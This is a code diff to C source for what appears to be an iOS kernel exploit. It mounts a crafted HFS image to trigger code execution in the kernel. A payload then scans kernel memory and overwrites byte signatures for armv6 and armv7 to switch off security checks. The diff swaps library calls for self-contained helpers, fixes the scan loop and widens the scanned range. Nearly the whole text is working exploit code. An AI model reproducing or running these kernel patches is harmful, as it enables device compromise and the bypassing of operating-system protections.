@@ -13,6 +13,14 @@
 #include <sys/stat.h>
 #include "payload.h"
 
+void* _memcpy(void* dest, const void* src, size_t n) {
+	char* dst8 = (char*)dest;
+	char* src8 = (char*)src;
+
+	while (n--) *dst8++ = *src8++;
+	return dest;
+}
+
 void prepare_vndevice() {
 	struct vn_ioctl vn;
 
@@ -43,15 +51,12 @@ void mount_evil_hfs() {
 	mount_args.hfs_uid=99;
 	mount_args.hfs_gid=99;
 	mount_args.hfs_mask=(S_IRWXU | S_IROTH | S_IXOTH);
+	
+	printf("Triggering kernel exploit!\n");
+
 	int ret = mount("hfs", "/mnt/", MNT_RDONLY, (void*) &mount_args);
 	
-	//*** kernel payload code execution happens here ***
-	
-	printf("mount ret code : 0x%X\n", ret);
-	if (ret < 0) {
-		printf("hfs mount failed. :-(\n");
-		exit(1);
-	}
+	printf("Payload returned successfully.\n");
 }
 
 void dump(void *addr, unsigned int size) {
@@ -62,6 +67,18 @@ void dump(void *addr, unsigned int size) {
 	for (i = 0; i < count; i+=4) {
 		kprintf("%08x %08x %08x %08x\n", daddr[i], daddr[i+1], daddr[i+2], daddr[i+3]);
 	}
+}
+
+int mem8eq(void * addr, unsigned char* data) {
+	unsigned int *p1 = (unsigned int *) addr;
+	unsigned int *p2 = (unsigned int *) data;
+	return (*p1==*p2 && p1[1]==p2[1]);
+}
+
+int mem16eq(void * addr, unsigned char* data) {
+	unsigned int *p1 = (unsigned int *) addr;
+	unsigned int *p2 = (unsigned int *) data;
+	return (*p1==*p2 && p1[1]==p2[1] && p1[2]==p2[2] && p1[3]==p2[3]);
 }
 
 int patch_kernel(unsigned char* address, unsigned int size) {
@@ -96,110 +113,110 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 	      85 68 02 93 01 93 00 2C  +  8 => 0E 93 BD 93 ; armv6
 	*/
 	unsigned int i = 0;
-	unsigned char *paddress = address;
+	unsigned char *paddress = address - 2;
 	
 	for(i = 0; i < size; i+=2) {
+		paddress+=2;
+
 		// Patch 1
-		if(!memcmp(paddress, "\x00\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00", 16)) {
+		if(mem16eq(paddress, "\x00\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00")) {
 			target = i + 0;
 			kprintf("Found kernel patch 1 at %p\n", &address[target]);
-			memcpy(&address[target], "\x01\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00", 16);
+			_memcpy(&address[target], "\x01\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00", 16);
 			continue;
 		}
 
 		// Patch 2
-		if(!memcmp(paddress, "\x00\xB1\x00\x24\x20\x46\x90\xBD", 8)) {
+		if(mem8eq(paddress, "\x00\xB1\x00\x24\x20\x46\x90\xBD")) {
 			target = i + 0;
 			kprintf("Found armv7 kernel patch 2 at %p\n", &address[target]);
-			memcpy((char*) &address[target], "\x00\xB1\x01\x24\x20\x46\x90\xBD", 8);
+			_memcpy((char*) &address[target], "\x00\xB1\x01\x24\x20\x46\x90\xBD", 8);
 			continue;
 		}
-		if(!memcmp(paddress, "\x0E\x00\xA0\xE1\x01\x10\x84\xE2", 8)) {
+		if(mem8eq(paddress, "\x0E\x00\xA0\xE1\x01\x10\x84\xE2")) {
 			target = i + 20;
 			kprintf("Found armv6 kernel patch 2 at %p\n", &address[target]);
-			memcpy((char*) &address[target], "\x00\x00\x00\x00", 4);
+			_memcpy((char*) &address[target], "\x00\x00\x00\x00", 4);
 			continue;
 		}
 
 		// Patch 3
-		if(!memcmp(paddress, "\x00\x23\x00\x94\x01\x95\x02\x95", 8)) {
+		if(mem8eq(paddress, "\x00\x23\x00\x94\x01\x95\x02\x95")) {
 			target = i + 10;
 			kprintf("Found kernel patch 3 at %p\n", &address[target]);
-			memcpy(&address[target], "\x00\x20\x00\xD3\x80\x04\x98\x02\x21\x7C\x4B\x20", 4);
+			_memcpy(&address[target], "\x00\x20\x00\xD3\x80\x04\x98\x02\x21\x7C\x4B\x20", 4);
 			continue;
 		}
 
 		// Patch 4
-		if(!memcmp(paddress, "\x02\x90\x03\x90\x1D\x49\x50\x46", 8)) {
+		if(mem8eq(paddress, "\x02\x90\x03\x90\x1D\x49\x50\x46")) {
 			target = i + 12;
 			kprintf("Found armv7 kernel patch 4 at %p\n", &address[target]);
-			memcpy(&address[target], "\x00\x20\x00\x20", 4);
+			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
-		if(!memcmp(paddress, "\x02\x90\x03\x90\x06\x9A\x07\x9B", 8)) {
+		if(mem8eq(paddress, "\x02\x90\x03\x90\x06\x9A\x07\x9B")) {
 			target = i + 12;
 			kprintf("Found armv6 kernel patch 4 at %p\n", &address[target]);
-			memcpy(&address[target], "\x00\x20\x00\x20", 4);
+			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
 
 		// Patch 5
-		if(!memcmp(paddress, "\xD3\x80\x04\x98\x02\x21\x7C\x4B", 8)
-				|| !memcmp(paddress, "\x98\x47\x50\xB9\x00\x98\x02\x21", 8)) {
+		if(mem8eq(paddress, "\xD3\x80\x04\x98\x02\x21\x7C\x4B")
+				|| mem8eq(paddress, "\x98\x47\x50\xB9\x00\x98\x02\x21")) {
 			target = i + 8;
 			kprintf("Found armv7 kernel patch 5 at %p\n", &address[target]);
-			memcpy(&address[target], "\x00\x20", 2);
+			_memcpy(&address[target], "\x00\x20", 2);
 			continue;
 		}
-		if(!memcmp(paddress, "\x0D\xD1\x01\x98\x02\x21\x34\x4B", 8)) {
+		if(mem8eq(paddress, "\x0D\xD1\x01\x98\x02\x21\x34\x4B")) {
 			target = i + 8;
 			kprintf("Found armv6 kernel patch 5 at %p\n", &address[target]);
-			memcpy(&address[target], "\x00\x20", 2);
+			_memcpy(&address[target], "\x00\x20", 2);
 			continue;
 		}
 
 		// Patch 6
-		if(!memcmp(paddress, "\x00\x28\x40\xF0\xCC\x80\x04\x98", 8)
-				|| !memcmp(paddress, "\x28\xB9\x00\x98\xFF\xF7\x03\xFF", 8)) {
+		if(mem8eq(paddress, "\x00\x28\x40\xF0\xCC\x80\x04\x98")
+				|| mem8eq(paddress, "\x28\xB9\x00\x98\xFF\xF7\x03\xFF")) {
 			target = i + 8;
 			kprintf("Found kernel patch 6 at %p\n", &address[target]);
-			memcpy(&address[target], "\x00\x20\x00\x20", 4);
+			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
 
 		// Patch 7
-		if(!memcmp(paddress, "\x1F\x4C\x1E\xE0\x28\x46\x51\x46", 8)) {
+		if(mem8eq(paddress, "\x1F\x4C\x1E\xE0\x28\x46\x51\x46")) {
 			target = i + 8;
 			kprintf("Found kernel patch 7 at %p\n", &address[target]);
-			memcpy(&address[target], "\x01\x20\x01\x20", 4);
+			_memcpy(&address[target], "\x01\x20\x01\x20", 4);
 			continue;
 		}
 
 		// Patch 8
-		if(!memcmp(paddress, "\xA0\x47\x08\xB1\x28\x46\x30\xE0", 8)) {
+		if(mem8eq(paddress, "\xA0\x47\x08\xB1\x28\x46\x30\xE0")) {
 			target = i + 8;
 			kprintf("Found kernel patch 8 at %p\n", &address[target]);
-			memcpy(&address[target], "\x00\x20\x00\x20", 4);
+			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
 
 		// Patch 9
-		if(!memcmp(paddress, "\x85\x68\x00\x23\x02\x93\x01\x93", 8) ||
-				!memcmp(paddress, "\x85\x68\x00\x23\x04\x93\x03\x93", 8)) {
+		if(mem8eq(paddress, "\x85\x68\x00\x23\x02\x93\x01\x93") ||
+				mem8eq(paddress, "\x85\x68\x00\x23\x04\x93\x03\x93")) {
 			target = i + 8;
 			kprintf("Found kernel patch 9 at %p\n", &address[target]);
-			memcpy(&address[target], "\x0B\xE0\xC0\x46", 4);
+			_memcpy(&address[target], "\x0B\xE0\xC0\x46", 4);
 			continue;
 		}
-
-		paddress+=2;
 	}
 	
 	return 0;
 }
 
 void real_payload() {
-	patch_kernel((void*) 0x80000000, 0x500000);
+	patch_kernel((void*) 0x80000000, 0xA00000);
 }
 
 void payload() {
